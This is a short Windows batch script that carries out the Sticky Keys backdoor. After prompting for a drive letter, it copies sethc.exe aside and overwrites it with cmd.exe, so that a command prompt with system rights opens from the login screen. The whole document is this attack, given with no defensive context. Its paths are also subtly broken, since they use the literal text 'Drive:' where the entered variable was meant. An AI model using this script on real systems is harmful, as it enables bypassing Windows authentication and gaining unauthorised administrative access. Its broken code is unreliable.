@echo off
set /p Drive=Enter local hard drive letter: 
if "%Drive%"=="" goto :eof
xcopy Drive:\windows\system32\sethc.exe Drive:
xcopy Drive:\windows\system32\cmd.exe Drive:\windows\system32\sethc.exe